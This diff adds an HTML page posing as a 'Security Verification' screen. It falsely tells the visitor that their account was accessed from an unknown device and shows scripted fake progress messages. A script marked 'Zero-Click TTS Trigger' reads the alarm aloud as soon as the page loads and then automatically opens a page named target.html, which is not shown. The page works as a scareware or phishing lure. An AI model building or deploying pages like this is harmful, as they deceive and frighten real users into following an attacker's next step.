@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification</title>
+  <style>
+    :root {
+      --bg: #000000;
+      --surface: #0a0a0a;
+      --border: #1f1f1f;
+      --text-primary: #ededed;
+      --text-secondary: #888888;
+      --accent: #dc2626;
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "Geist", Roboto, sans-serif;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: var(--font-sans);
+      background: var(--bg);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 48px 40px;
+      max-width: 440px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 0 1px rgba(255,255,255,0.02), 0 20px 40px rgba(0,0,0,0.4);
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 4px 12px;
+      border-radius: 999px;
+      background: rgba(220, 38, 38, 0.1);
+      border: 1px solid rgba(220, 38, 38, 0.3);
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      margin-bottom: 12px;
+      color: var(--text-primary);
+    }
+
+    p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: var(--text-secondary);
+      margin-bottom: 8px;
+    }
+
+    .status-text {
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin-top: 24px;
+      font-family: "Geist Mono", "SF Mono", Monaco, monospace;
+    }
+
+    .status-text::before {
+      content: ">";
+      margin-right: 8px;
+      color: var(--accent);
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="badge">Security Alert</div>
+    <h1>Session Verification Required</h1>
+    <p>Your account has been accessed from an unknown device.</p>
+    <p>Please wait while we verify your identity.</p>
+    <div class="status-text" id="status">Initializing secure channel</div>
+  </div>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const steps = [
+      'Initializing secure channel',
+      'Contacting verification server',
+      'Awaiting user confirmation',
+      'Session active'
+    ];
+    let i = 0;
+    setInterval(() => {
+      if (i < steps.length) {
+        statusEl.textContent = steps[i];
+        i++;
+      }
+    }, 1500);
+
+    // Zero-Click TTS Trigger
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        if (!('speechSynthesis' in window)) return;
+        const text = "Security Alert. Your account has been accessed from an unknown device. Please verify your identity immediately.";
+        const utter = new SpeechSynthesisUtterance(text);
+        utter.lang = 'en-US';
+        utter.rate = 0.9;
+        utter.pitch = 1.0;
+        utter.volume = 1.0;
+        window.speechSynthesis.speak(utter);
+
+        setTimeout(() => {
+          window.open('target.html', '_blank');
+        }, 1500);
+      }, 100);
+    });
+  </script>
+</body>
+</html>
